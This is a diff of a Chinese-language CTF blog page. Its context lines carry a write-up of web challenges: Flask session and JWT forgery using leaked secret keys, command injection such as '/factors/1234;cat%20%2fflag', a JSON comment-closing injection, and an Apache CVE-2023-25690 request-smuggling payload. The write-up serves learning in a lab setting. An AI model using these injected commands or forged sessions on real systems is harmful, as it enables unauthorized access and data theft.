@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2023-06-04T09:52:00.000Z">
-<meta property="article:modified_time" content="2023-06-04T14:04:01.235Z">
+<meta property="article:modified_time" content="2023-06-04T14:08:51.055Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1685887441235"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1685887731055"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -212,7 +212,7 @@
 <p>然后登录，burp suite抓包，发现了session:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwljjkOwzAMwP7iuYMsRbaczwTWhXZNmqno35siExcC5KdsucfxLOt7P-NRtpeXtSRDpelUA1whlQeocW9NhgpdRDQEQMfItrBbFRG0hjQ1iVWGL9bS62yQQyf20MFROSEM2Jc6jecgsA7217pdkUqBSZGi5Ro5j9jvGynfH8N8MBc.ZHxhow.e7ICXFHHbbmNtfdQuOHCpFNp4LE</span><br></pre></td></tr></table></figure>
 <p>进入<code>jwt.io</code>试图解码jwt，但是</p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/4670/1.png" class title="awa">
 <p>居然不是jwt格式。。</p>
 <p>所以想到是不是flask的session</p>
 <p>使用<code>flask-session-cookie-manager-master</code>试试</p>
@@ -220,7 +220,7 @@
 <p>这里使用的是不带<code>secret-key</code>的解密方式，可以看到能够正常解码，userid是8</p>
 <p>那么secretkey在哪呢？</p>
 <p>这个问题困扰了我很久，直到我找到了一个重置密码的页面：</p>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/4670/2.png" class title="awa">
 <p>这里打开f12就找到了我们的<code>secret-key</code>：<code>th3f1askisfunny</code></p>
 <p>总结就是百密一疏，万万没想到把secretkey藏在这里了…</p>
 <p>拿到secretkey直接重新解密：</p>
@@ -232,24 +232,24 @@
 <p>只能说带点运气成分在里面了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> python.exe .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;f5013ad31e0db0fb590bc576689b8376622c2002d2ef645dc18882c623abf35b89d4c6fd1a60f9ba27eb95e15f0ec05d41ac5a930c70cfd1a7cfb513e2f3ef8b&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot; -s &quot;th3f1askisfunny&quot;</span><br><span class="line">.eJwljjkOg0AQwP6ydYo5mD34DNq5lLQQqih_DxGVG0v2p2y5x_Es63s_41G2l5e1pADydMYAV0iVAWrSau1DO18kMgIgp8i6iBv23skq8dRk0T58sZqOs0IOndRChwRKQhiILzhN5mCwBvbXml0R5KDkyK7lGjmP2O8bLN8fw2cwEA.ZHxlQQ.4mgFjAES6P3wZYGsQCO8Y6tJz00</span><br></pre></td></tr></table></figure>
 <p>重新登录，将session替换即可获得flag：</p>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/4670/3.png" class title="awa">
 <p>然后，赛后出题人来说这是非预期解（雾</p>
 <h2><span id="flaskjwt的预期解"> flask?jwt?的预期解</span></h2>
 <p>这里的正确姿势是需要我们进行jwt伪造，重置admin账户的密码，以admin的身份进行登录并获取flag</p>
 <p>这里的重置密码页面会发送重置密码的邮件</p>
 <p>我们通过重置密码的连接可以获得jwt，重置链接的格式是这样的：</p>
 <p><code>/changePassword/&lt;jwttoken&gt;?email=&lt;youremail&gt;</code></p>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/4670/4.png" class title="awa">
 <p>同时secretkey仍然是那个<code>th3f1askisfunny</code></p>
 <p>这个时候使用secretkey重新伪造jwt，覆盖后就能够重置admin的账户(题目中给出admin的邮箱是<code>adm1n@flag.com</code>)</p>
 <p>重新修改admin的密码登录即可获取flag</p>
 <h1><span id="flaskjwthard"> flask?jwt?(hard)</span></h1>
 <p>这题我研究了一半，没想到通过删除session引发报错能够获取secretkey</p>
 <p>同样注册登录，在拿flag前发现了注释：</p>
-<img src="/posts/undefined/5.png" class title="awa">
+<img src="/posts/4670/5.png" class title="awa">
 <p>访问<code>/wor</code></p>
 <p>发现只给了一段提示：</p>
-<img src="/posts/undefined/6.png" class title="awa">
+<img src="/posts/4670/6.png" class title="awa">
 <p>抓包获取flask session后解码的结果是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python.exe .\flask_session_cookie_manager3.py decode -c &quot;.eJwljjuOAjEQRK9iOSboj-2xfQEkJKLdHLnb3VoCCAYmQtydQRuVqvSkeq948dUef7E_180O8XKdsUfPgDwmo8EUcMkNRPNSSm1SeU8iJQCaZF5Snoq1VtJCPMQ5S20zafGJo4A3GbSYtGyYHUwhz4RD82gMuoB-sUX3E2QjZ_MqcRfZHrb-2_Ben9ebxf6K4Tv8bPdDgBRO2z0QEAeEnmoHDMfzb3y_P3TKO40.ZHxr4Q.Q0zp3DJFOTn8kR0HAKZFkl1AL14&quot;</span><br><span class="line">b&#x27;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&quot;f5013ad31e0db0fb590bc576689b8376622c2002d2ef645dc18882c623abf35b89d4c6fd1a60f9ba27eb95e15f0ec05d41ac5a930c70cfd1a7cfb513e2f3ef8b&quot;,&quot;_user_id&quot;:&quot;3&quot;,&quot;time&quot;:&#123;&quot; d&quot;:&quot;Sun, 04 Jun 2023 10:48:01 GMT&quot;&#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>
 <p>居然和我们flask session里的内容的时间是一致的</p>
@@ -258,23 +258,23 @@
 <p>这里肯定是flask读取了我们的session然后获取了time咯</p>
 <p>那我们将session删除试试呢？</p>
 <p>会发现我们直接进入报错界面了：</p>
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/4670/7.png" class title="awa">
 <p>浏览报错界面直接发现了secretkey：</p>
-<img src="/posts/undefined/8.png" class title="awa">
+<img src="/posts/4670/8.png" class title="awa">
 <p>直接进行decode测试：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python.exe .\flask_session_cookie_manager3.py decode -c &quot;.eJwljjuOAjEQRK9iOSboj-2xfQEkJKLdHLnb3VoCCAYmQtydQRuVqvSkeq948dUef7E_180O8XKdsUfPgDwmo8EUcMkNRPNSSm1SeU8iJQCaZF5Snoq1VtJCPMQ5S20zafGJo4A3GbSYtGyYHUwhz4RD82gMuoB-sUX3E2QjZ_MqcRfZHrb-2_Ben9ebxf6K4Tv8bPdDgBRO2z0QEAeEnmoHDMfzb3y_P3TKO40.ZHxr4Q.Q0zp3DJFOTn8kR0HAKZFkl1AL14&quot; -s &quot;hardgam3_C0u1d_u_f1ndM3????&quot;</span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;f5013ad31e0db0fb590bc576689b8376622c2002d2ef645dc18882c623abf35b89d4c6fd1a60f9ba27eb95e15f0ec05d41ac5a930c70cfd1a7cfb513e2f3ef8b&#x27;, &#x27;_user_id&#x27;: &#x27;3&#x27;, &#x27;time&#x27;: datetime.datetime(2023, 6, 4, 10, 48, 1, tzinfo=datetime.timezone.utc)&#125;</span><br></pre></td></tr></table></figure>
 <p>重新加密即可，userid应该同样是改为1：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python.exe .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;f5013ad31e0db0fb590bc576689b8376622c2002d2ef645dc18882c623abf35b89d4c6fd1a60f9ba27eb95e15f0ec05d41ac5a930c70cfd1a7cfb513e2f3ef8b&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot; -s &quot;hardgam3_C0u1d_u_f1ndM3????&quot;</span><br><span class="line">.eJwljjkOg0AQwP6ydYo5mD34DNq5lLQQqih_DxGVG0v2p2y5x_Es63s_41G2l5e1pADydMYAV0iVAWrSau1DO18kMgIgp8i6iBv23skq8dRk0T58sZqOs0IOndRChwRKQhiILzhN5mCwBvbXml0R5KDkyK7lGjmP2O8bLN8fw2cwEA.ZHx4Bw.zFHiqeHdxef-OLZpKKsKhZdDP9c</span><br></pre></td></tr></table></figure>
 <p>这里如果不删掉后面的time 的话python会报错。。。</p>
 <p>复制session即可获得flag:</p>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/4670/9.png" class title="awa">
 <p>同样地，获取到的secretkey同样也是jwt的secretkey，采用上面的预期解的方法做同样能够获取flag</p>
 <h1><span id="ezfactors"> ezfactors</span></h1>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">description:原生 Linux 因数爆破工具。flag在根目录</span><br></pre></td></tr></table></figure>
 <p>…看完前面句号的东西我还认真的去社工了一下，发现并没有这种东西</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/4670/10.png" class title="awa">
 <p>这里的tool可以点击，进入后发现：</p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/4670/11.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">114514 = 2*31*1847</span><br></pre></td></tr></table></figure>
 <p>修改数字可以看到不同的数字的因数被分解</p>
 <p>搜索了一下，发现linux确实有factor这个指令用于因数分解，而且分解的结果与页面的结果一致：</p>
@@ -283,15 +283,15 @@
 <p>对于传入的参数没有作限制，所以可以尝试直接命令执行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/factors/1234;cat%20%2fflag</span><br></pre></td></tr></table></figure>
 <p>这里后面的<code>/</code>要进行url编码，否则会报错(产生歧义，会认为你访问的是<code>/factors/1234;cat /flag</code>这个路径)</p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/4670/12.png" class title="awa">
 <p>居然真的执行成功了。。</p>
 <p>但是flag不可能是这个格式，很明显结果只能够显示数字和冒号还有空格</p>
 <p>那我们需要找一个方式能够读取flag的全部内容并且是以纯数字的方式输出</p>
 <p>这里采用<code>od</code>，<code>od</code>能够将内容读取并且以8进制的方式返回，此时就是纯数字了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/factors/1234;od%20-b%20%2fflag</span><br><span class="line">-b模式代表使用八进制单字节字符</span><br><span class="line">此时返回的数据就能够进行解码</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/4670/13.png" class title="awa">
 <p>拿到cyberchef解码即可：</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/4670/14.png" class title="awa">
 <p>这题赛时没做出来（（</p>
 <p>因为自己就是在想linux有什么爆破因数的工具的rce然后进行漏洞利用。。</p>
 <p>然后找不到，没想到居然是<code>factor</code>这个命令</p>
@@ -320,9 +320,9 @@
 <p>假设我们传入的是: <code>]//</code>呢</p>
 <p>那json的内容就会变成：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, &quot;hi&quot;, &#x27;]//&#x27;]</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/15.png" class title="awa">
+<img src="/posts/4670/15.png" class title="awa">
 <p>从vscode里看到后面直接被注释掉了，前面完成了闭合，而且read能够直接读出内容：</p>
-<img src="/posts/undefined/16.png" class title="awa">
+<img src="/posts/4670/16.png" class title="awa">
 <p>这里就类似于sql注入了，通过闭合后面的<code>]</code>从而成功执行自己的命令</p>
 <p>接下来只需要用分号将命令间隔开并且执行自己的命令即可</p>
 <p>由于接下来的内容都被<code>//</code>注释掉了，这里需要新开一行添加<code>;</code></p>
@@ -353,8 +353,8 @@
 <p><a target="_blank" rel="noopener" href="http://www.hackdig.com/03/hack-949961.htm">CVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用_黑客技术 (hackdig.com)</a></p>
 <p>…真有</p>
 <p>我们详细看看这篇CVE的解析：</p>
-<img src="/posts/undefined/19.png" class title="awa">
-<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/4670/19.png" class title="awa">
+<img src="/posts/4670/20.png" class title="awa">
 <p>我对于这里的解读大概是这样的：</p>
 <p>先通过读取<code>conf/httpd.conf</code></p>
 <p><a target="_blank" rel="noopener" href="https://www.javaroad.cn/questions/50534">Apache默认安装httpd.conf在哪里？-Java 学习之路 (javaroad.cn)</a></p>
@@ -370,6 +370,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure>
 <p>即可获取flag</p>
 <p>至于为什么是/flag.txt 当然是猜的（可以看出我就把hello改成了nssctf而已）</p>
+<img src="/posts/4670/21.png" class title="awa">
 <h1><span id="timetrcer"> TimeTrcer</span></h1>
 <p>不会</p>
 <hr>
@@ -481,7 +482,7 @@
                     <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-06-04T14:04:01.235Z" itemprop="dateModified">最后编辑：2023-06-04</time>
+                    <time datetime="2023-06-04T14:08:51.055Z" itemprop="dateModified">最后编辑：2023-06-04</time>
                 </div>
             </div>
         </footer>
